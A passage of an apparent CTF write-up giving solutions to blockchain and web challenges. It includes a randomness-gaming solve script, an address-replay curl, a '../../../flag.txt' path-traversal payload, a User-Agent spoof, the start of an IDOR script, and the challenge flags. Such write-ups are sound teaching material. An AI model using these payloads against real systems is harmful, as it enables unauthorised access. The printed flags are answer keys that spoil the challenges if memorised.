</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">51</span><span>        </span><span class="token" style="color:#6a9955">// Updating balance</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">52</span><span>        currentBalance </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#c586c0">await</span><span> crazyGambler</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">gamblersCredit</span><span class="token" style="color:#d4d4d4">(</span><span>deployer</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">toNumber</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">53</span><span>        </span><span class="token" style="color:#4ec9b0">console</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">log</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&#x27;current balance&#x27;</span><span class="token" style="color:#d4d4d4">,</span><span> currentBalance</span><span class="token" style="color:#d4d4d4">)</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">54</span><span>        </span><span class="token" style="color:#6a9955">// So the script don&#x27;t overrun</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">55</span><span>        </span><span class="token" style="color:#c586c0">if</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span>currentBalance </span><span class="token" style="color:#d4d4d4">&gt;=</span><span> </span><span class="token" style="color:#b5cea8">20</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#c586c0">break</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">56</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">57</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">58</span><span>        </span><span class="token" style="color:#6a9955">// Algorithm foo</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">59</span><span>        solved </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#c586c0">await</span><span> crazyGambler</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">canGetFlag</span><span class="token" style="color:#d4d4d4">(</span><span>deployer</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span> </span><span class="token literal-property" style="color:#9cdcfe">gasLimit</span><span class="token" style="color:#d4d4d4">:</span><span> </span><span class="token" style="color:#b5cea8">30000</span><span> </span><span class="token" style="color:#d4d4d4">}</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">60</span><span>        </span><span class="token" style="color:#4ec9b0">console</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">log</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;Yes it&#x27;s solved&quot;</span><span class="token" style="color:#d4d4d4">)</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">61</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">62</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">63</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">64</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">65</span><span></span><span class="token" style="color:#569CD6">async</span><span> </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">main</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">66</span><span>    </span><span class="token" style="color:#c586c0">await</span><span> </span><span class="token" style="color:#dcdcaa">setUp</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">67</span><span>    </span><span class="token" style="color:#c586c0">await</span><span> </span><span class="token" style="color:#dcdcaa">solve</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">68</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">69</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">70</span><span></span><span class="token" style="color:#dcdcaa">main</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">then</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">=&gt;</span><span> </span><span class="token" style="color:#4ec9b0">console</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">log</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&#x27;finished&#x27;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#c586c0">catch</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#9cdcfe">error</span><span> </span><span class="token" style="color:#569CD6">=&gt;</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">71</span><span>    </span><span class="token" style="color:#4ec9b0">console</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">log</span><span class="token" style="color:#d4d4d4">(</span><span>error</span><span class="token" style="color:#d4d4d4">)</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">72</span><span></span><span class="token" style="color:#d4d4d4">}</span><span class="token" style="color:#d4d4d4">)</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">73</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">74</span>
</span></code></div></pre>
<p class="chakra-text css-0" node="[object Object]"><code class="inline-code">securinets{G4mbl1ng_Th3_Bl0ck_1s_A_MyTh}</code></p>
<blockquote>
<p class="chakra-text css-0" node="[object Object]">Kudos to one participant, who did execute the script manually. It&#x27;s really hard to do so. 30% chance to get a good hash ( Not really but we can say so) and with
a block time of 15 seconds. The script should run for some time. Mine did solve it in 30 minute while. I know it&#x27;s not the best way to present such a task. But that&#x27;s the closest to how hacks happen on the mainnet. They needs patience.</p>
</blockquote>
<p class="chakra-text css-0" node="[object Object]"><div class="chakra-stack css-bwdt07"><div class="chakra-stack css-1pb7l90"><div class="css-1ui0t94"><img src="https://res.cloudinary.com/dsdvvwb8v/image/upload/v1664925884/Friendly-ctf/odd_elq1gd.png" alt="Picture of participant conversation" style="scale:1.2px;width:100%"/></div><p class="chakra-text css-1qz7fzr">Picture of participant conversation</p></div></div></p>
<h3 class="chakra-heading css-xm64py" id="lesson learned">Lesson Learned</h3>
<ul>
<li>Randomness is impossible to perform in the blockchain world without the help of off-chain solutions. Oracles are made for that. But wait how trustful are they ?</li>
</ul>
<div class="css-17l36zw"></div>
<h2 class="chakra-heading css-1uc67dn" id="there is more than the eye can see">There is more than the eye can see</h2>
<h3 class="chakra-heading css-xm64py" id="greedy robot: the mean solution ">Greedy Robot: the mean solution <code class="inline-code">mean for the robot ofc :)</code></h3>
<p class="chakra-text css-0" node="[object Object]">Okay so here is the trick, there are two intended solutions to this task each one gives different insight.</p>
<p class="chakra-text css-0" node="[object Object]">Most people stopped the enumeration and went to search how they can send ethers on the blockchain even that the price is high ( half what the alchemy - most generous faucet) gives you.</p>
<p class="chakra-text css-0" node="[object Object]">That&#x27;s the basic challenge, but I wanted to raise the concern that in the dapps world there is huge immaturity from the developers in their approach of integrating blockchain with old technologies ( web tech in this situation ). If you check the contract&#x27;s source code by using the <code class="inline-code">etherscan</code>.</p>
<pre><div class="codeStyle" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-js" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">1</span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">canPass</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#9cdcfe">address contributorAddress</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> view </span><span class="token" style="color:#dcdcaa">returns</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#9cdcfe">bool</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">2</span><span>        </span><span class="token" style="color:#c586c0">return</span><span> contributors</span><span class="token" style="color:#d4d4d4">[</span><span>contributorAddress</span><span class="token" style="color:#d4d4d4">]</span><span> </span><span class="token" style="color:#d4d4d4">&gt;=</span><span> </span><span class="token" style="color:#9cdcfe">MINIMUM_CONTRIBUTION</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">3</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">4</span>
</span></code></div></pre>
<p class="chakra-text css-0" node="[object Object]">Okay so it&#x27;s passing the address and checking if it has sent ethers or not. Seeing the client of the dapp, It&#x27;s sending the address</p>
<p class="chakra-text css-0" node="[object Object]"><div class="chakra-stack css-bwdt07"><div class="chakra-stack css-1pb7l90"><div class="css-1ui0t94"><img src="https://res.cloudinary.com/dsdvvwb8v/image/upload/v1664924237/Friendly-ctf/vulnerable-request_cdtawm.png" alt="Request" style="scale:1.2px;width:100%"/></div><p class="chakra-text css-1qz7fzr">Request</p></div></div></p>
<p class="chakra-text css-0" node="[object Object]">So, the server is actually checking if the user sent the ethers or not by calling the canPass from the contract. Wait, there is no mechanism to ensure that it&#x27;s the same user who sent the ethers is using the dapp right now.</p>
<p class="chakra-text css-0" node="[object Object]">I even sent ethers myself to the contract so anyone can grab my address and send it to the api to get the flag :)</p>
<p class="chakra-text css-0" node="[object Object]"><div class="chakra-stack css-bwdt07"><div class="chakra-stack css-1pb7l90"><div class="css-1ui0t94"><img src="https://res.cloudinary.com/dsdvvwb8v/image/upload/v1664924238/Friendly-ctf/greedy-robots-tx-logs_mnv9z5.png" alt="Other" style="scale:1.2px;width:100%"/></div><p class="chakra-text css-1qz7fzr">Other</p></div></div></p>
<pre><div class="codeStyle" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-bash" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">1</span><span class="token" style="color:#dcdcaa">curl</span><span>  https://greedy-robots.ctf.securinets.tn/api/flag --json &#x27;</span><span class="token" style="color:#d4d4d4">{</span><span class="token" style="color:#d4d4d4">{</span><span class="token" style="color:#ce9178">&quot;address&quot;</span><span class="token" style="color:#4ec9b0">:</span><span class="token" style="color:#ce9178">&quot;0x84e7a3679A82C2766Ff8382862ab883FF9460307&quot;</span><span class="token" style="color:#d4d4d4">}</span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">2</span>
</span></code></div></pre>
<p class="chakra-text css-0" node="[object Object]"><div class="chakra-stack css-bwdt07"><div class="chakra-stack css-1pb7l90"><div class="css-1ui0t94"><img src="https://res.cloudinary.com/dsdvvwb8v/image/upload/v1664924235/Friendly-ctf/evil-robot_ic0ajq.png" alt="Evil R0b0t" style="scale:1.2px;width:100%"/></div><p class="chakra-text css-1qz7fzr">Evil R0b0t</p></div></div></p>
<p class="chakra-text css-0" node="[object Object]">Now you get the challenge name <code class="inline-code">securinets{p0intless_g3n3ros1tY}</code></p>
<h3 class="chakra-heading css-xm64py" id="#8 lesson learned">#8 Lesson learned</h3>
<p class="chakra-text css-0" node="[object Object]">The weakest link in blockchain is its integration with current technologies. Never forget the old arts !</p>
<div class="css-17l36zw"></div>
<div class="css-17l36zw"></div>
<h1 class="chakra-heading css-1yzq3sl">Web</h1>
<h2 class="chakra-heading css-1uc67dn" id="cr4zy-js0n">Cr4zy-Js0n</h2>
<p class="chakra-text css-0" node="[object Object]"><div class="chakra-stack css-bwdt07"><div class="chakra-stack css-1pb7l90"><div class="css-1ui0t94"><img src="https://res.cloudinary.com/dsdvvwb8v/image/upload/v1664924233/Friendly-ctf/crazy-json_xbuh1l.png" alt="Cr4zy-Js0n" style="scale:1.2px;width:100%"/></div><p class="chakra-text css-1qz7fzr">Cr4zy-Js0n</p></div></div></p>
<p class="chakra-text css-0" node="[object Object]">I really want to apologize for the confusion this task has created. I wanted to expose the beginner to JSON which is a data format commonly used in web application nowadays. Didn&#x27;t mean to create confusion on getting answers to the gates. I wanted it to be a fun task :/ .</p>
<style data-emotion="css 6gwv5m">.css-6gwv5m{font-family:var(--chakra-fonts-heading);font-weight:700;font-size:36px;line-height:1.33;margin-bottom:var(--chakra-space-3);margin-top:var(--chakra-space-6);}@media screen and (min-width: 48em){.css-6gwv5m{line-height:1.2;}}</style><h4 class="chakra-heading css-6gwv5m" id=""><style data-emotion="css gv9qss">.css-gv9qss{font-weight:700;color:var(--chakra-colors-red-400);font-size:var(--chakra-fontSizes-lg);}</style><span class="chakra-text css-gv9qss">Solution</span></h4>
<pre><div class="codeStyle" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-bash" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">1</span><span class="token" style="color:#dcdcaa">curl</span><span> URL -X POST --json </span><span class="token" style="color:#ce9178">&#x27;{&quot;answers&quot;:[{&quot;Gate One&quot;:&quot;Man&quot;},{&quot;Gate Two&quot;:true},{&quot;Gate Three&quot;:12}]}&#x27;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">2</span>
</span></code></div></pre>
<p class="chakra-text css-0" node="[object Object]"><code class="inline-code">securinets{w3b_5p34k5_j50n_It_S4fe?}</code></p>
<div class="css-17l36zw"></div>
<h2 class="chakra-heading css-1uc67dn" id="agent-007">Agent-007</h2>
<p class="chakra-text css-0" node="[object Object]"><div class="chakra-stack css-bwdt07"><div class="chakra-stack css-1pb7l90"><div class="css-1ui0t94"><img src="https://res.cloudinary.com/dsdvvwb8v/image/upload/v1664924233/Friendly-ctf/agent-007_k9g2vn.png" alt="Agent-007" style="scale:1.2px;width:100%"/></div><p class="chakra-text css-1qz7fzr">Agent-007</p></div></div></p>
<h4 class="chakra-heading css-6gwv5m" id=""><span class="chakra-text css-gv9qss">Solution</span></h4>
<p class="chakra-text css-0" node="[object Object]">User-agent header to identify user&#x27;s browser. Used to identify secret agents.</p>
<pre><div class="codeStyle" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-bash" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">1</span><span class="token" style="color:#9cdcfe">`</span><span class="token" style="color:#dcdcaa">curl</span><span class="token" style="color:#9cdcfe"> URL -H </span><span class="token" style="color:#ce9178">&quot;User-Agent: James Bond&quot;</span><span class="token" style="color:#9cdcfe">`</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">2</span>
</span></code></div></pre>
<h2 class="chakra-heading css-1uc67dn" id="l0ki-was-l0st">L0ki-Was-L0st</h2>
<p class="chakra-text css-0" node="[object Object]"><div class="chakra-stack css-bwdt07"><div class="chakra-stack css-1pb7l90"><div class="css-1ui0t94"><img src="https://res.cloudinary.com/dsdvvwb8v/image/upload/v1664924213/Friendly-ctf/l0ki-w4s-l0st_ynzmxn.png" alt="L0ki-Was-L0st" style="scale:1.2px;width:100%"/></div><p class="chakra-text css-1qz7fzr">L0ki-Was-L0st</p></div></div></p>
<blockquote>
<p class="chakra-text css-0" node="[object Object]">I didn&#x27;t watch the movie/serie It&#x27;s totally inspired for my interest for Nordic/Pagan Mythology :P</p>
</blockquote>
<p class="chakra-text css-0" node="[object Object]">Simple LFI vulnerability on <code class="inline-code">page</code> url paramater. get the flag by visiting <code class="inline-code">URL?page=../../../flag.txt</code>.</p>
<p class="chakra-text css-0" node="[object Object]"><code class="inline-code">securinets{L00k_4_LF1_N0T_F0R_L0K1}</code></p>
<h2 class="chakra-heading css-1uc67dn" id="f00ly-f4ct0ry">F00ly-F4ct0ry</h2>
<p class="chakra-text css-0" node="[object Object]"><div class="chakra-stack css-bwdt07"><div class="chakra-stack css-1pb7l90"><div class="css-1ui0t94"><img src="https://res.cloudinary.com/dsdvvwb8v/image/upload/v1664924232/Friendly-ctf/fooly-f4ctory_hv3dwq.png" alt="F00ly-F4ct0ry" style="scale:1.2px;width:100%"/></div><p class="chakra-text css-1qz7fzr">F00ly-F4ct0ry</p></div></div></p>
<ul>
<li><a class="chakra-link css-9olwc6" href="https://portswigger.net/web-security/access-control/idor">IDOR ressource</a></li>
</ul>
<pre><div class="codeStyle" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-py" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">1</span><span class="token" style="color:#569CD6">import</span><span> requests
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">2</span><span></span><span class="token" style="color:#569CD6">import</span><span> os
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">3</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">4</span><span>URL</span><span class="token" style="color:#d4d4d4">=</span><span class="token" style="color:#ce9178">&#x27;URL_HERE&#x27;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">5</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">6</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">7</span><span>session </span><span class="token" style="color:#d4d4d4">=</span><span> requests</span><span class="token" style="color:#d4d4d4">.</span><span>Session</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">8</span><span></span><span class="token" style="color:#569CD6">with</span><span> requests</span><span class="token" style="color:#d4d4d4">.</span><span>Session</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">as</span><span> s</span><span class="token" style="color:#d4d4d4">:</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">9</span><span>    login_resp</span><span class="token" style="color:#d4d4d4">=</span><span> s</span><span class="token" style="color:#d4d4d4">.</span><span>post</span><span class="token" style="color:#d4d4d4">(</span><span>URL</span><span class="token" style="color:#d4d4d4">+</span><span class="token" style="color:#ce9178">&#x27;/login&#x27;</span><span class="token" style="color:#d4d4d4">,</span><span>data</span><span class="token" style="color:#d4d4d4">=</span><span class="token" style="color:#d4d4d4">{</span><span class="token" style="color:#ce9178">&quot;username&quot;</span><span class="token" style="color:#d4d4d4">:</span><span class="token" style="color:#ce9178">&quot;test2&quot;</span><span class="token" style="color:#d4d4d4">,</span><span class="token" style="color:#ce9178">&quot;password&quot;</span><span class="token" style="color:#d4d4d4">:</span><span class="token" style="color:#ce9178">&quot;test2&quot;</span><span class="token" style="color:#d4d4d4">}</span><span class="token" style="color:#d4d4d4">)</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">10</span><span>    mecha_resp</span><span class="token" style="color:#d4d4d4">=</span><span> s</span><span class="token" style="color:#d4d4d4">.</span><span>get</span><span class="token" style="color:#d4d4d4">(</span><span>URL</span><span class="token" style="color:#d4d4d4">+</span><span class="token" style="color:#ce9178">&#x27;/mecha/1&#x27;</span><span class="token" style="color:#d4d4d4">)</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">11</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">12</span><span>    start_flag_index</span><span class="token" style="color:#d4d4d4">=</span><span>mecha_resp</span><span class="token" style="color:#d4d4d4">.</span><span>text</span><span class="token" style="color:#d4d4d4">.</span><span>index</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&#x27;securinets&#x27;</span><span class="token" style="color:#d4d4d4">)</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">13</span><span>    end_flag_index</span><span class="token" style="color:#d4d4d4">=</span><span>mecha_resp</span><span class="token" style="color:#d4d4d4">.</span><span>text</span><span class="token" style="color:#d4d4d4">.</span><span>index</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&#x27;}&#x27;</span><span class="token" style="color:#d4d4d4">)</span><span>
